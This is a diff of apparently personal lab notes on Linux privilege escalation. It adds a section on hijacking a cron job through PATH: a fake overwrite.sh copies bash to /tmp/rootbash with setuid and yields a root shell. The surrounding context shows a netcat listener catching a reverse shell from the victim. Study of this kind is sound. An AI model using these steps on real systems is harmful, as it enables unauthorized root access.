@@ -248,7 +248,6 @@ Remember **everything** on Linux is a file.
 
 More here about the command [above](https://www.reddit.com/r/LiveOverflow/comments/a2kahp/comment/eazuui7/).
 
-
 Listen to any machine that will connect to the temporary server in port **4444**.
 ```Shell
 nc -nvlp 4444
@@ -262,6 +261,43 @@ Flags explanation:
 Since the **cron job** runs every minute we are now connected to the Victim's machine through **nc**.
 
 ![[Pasted image 20220729205801.png]]
+
+---
+
+## Cron Jobs - PATH Environment Variable
+
+```ad-info
+title: PATH
+It can run a executable program without specifying the **absolute** path of a executable program.
+
+In windows this is the **RUN** app (Not sure if its an app though).
+
+More info about PATH [here](https://superuser.com/a/284351/1701484)
+
+```
+
+---
+
+We noticed that there is a **cron job** that runs on every minute that is **overwrite.sh**,  but the problem is they didn't specify the **absolute path** and **crontab** will look all scripts specified in the **PATH**.
+
+![[Pasted image 20220730202239.png]]
+
+Created a bash script file named **overwrite.sh** in the user home directory **/home/user**.
+```bash
+#!/bin/bash  
+  
+cp /bin/bash /tmp/rootbash  
+chmod +xs /tmp/rootbash
+```
+
+Giving **execute** permission on the file.
+```Shell
+chmod +x /home/user/overwrite.sh
+```
+
+After **rootbash** is created in the dir **/tmp**, we can now run and gain a **root** shell.
+
+![[Pasted image 20220730202133.png]]
 
 ---
 
